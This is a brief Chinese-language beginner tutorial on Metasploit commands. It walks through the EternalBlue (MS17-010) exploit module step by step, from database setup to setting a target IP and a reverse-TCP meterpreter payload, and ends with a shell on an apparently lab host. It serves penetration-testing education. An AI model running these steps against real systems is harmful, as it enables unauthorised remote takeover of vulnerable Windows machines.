本篇文字主要利用ms17-010漏洞简单的介绍了一下Metasploit基本操作和命令演示，希望对于新手有一些帮助。

启用postgresql数据库 Service postgresql start

查看数据库启用状态Service postgresql status

Msfdb init 数据库初始化（首次启用需要初始化数据库）

初始化后会在/usr/share/metasploit-framework/config生成一个database.yml配置文件

终端运行msfconsole

查看数据库连接状态db_status，如图说明已连接上数据库

Msf>输入？或者help显示全部命令

用ms17-010来做命令演示搜索漏洞模块Msf>search ms17-010

加载漏洞模块msf > use exploit/windows/smb/ms17_010_eternalblue

查看模块所需要的配置msfexploit(windows/smb/ms17_010_eternalblue) > show options

其他的都是默认配置，只需要配置rhost即可

msfexploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.117.130

加载payload并show option查看是否加载成功

msf exploit(windows/smb/ms17_010_eternalblue)> set payload windows/x64/meterpreter/reverse_tcp

设置监听端口和主机

输入run进行攻击

成功返回metepreters
